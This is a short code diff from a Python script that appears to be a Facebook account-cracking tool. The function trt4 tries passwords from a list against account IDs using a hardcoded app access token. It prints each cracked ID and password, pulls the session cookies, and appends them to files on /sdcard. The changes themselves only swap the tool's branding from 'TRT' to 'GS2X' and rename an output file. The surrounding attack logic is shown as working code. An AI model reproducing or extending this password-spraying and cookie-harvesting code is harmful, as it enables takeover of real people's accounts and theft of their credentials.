@@ -1504,7 +1504,7 @@ def trt3(ids,passlist):
 def trt4(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [GS2X-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1573,10 +1573,10 @@ def trt4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [GS2X-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/GS2X-M3-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                                        open('/sdcard/GS2XM4-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                                         open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
@@ -1587,7 +1587,7 @@ def trt4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\x1b[38;5;205m [GS2X-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                         open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
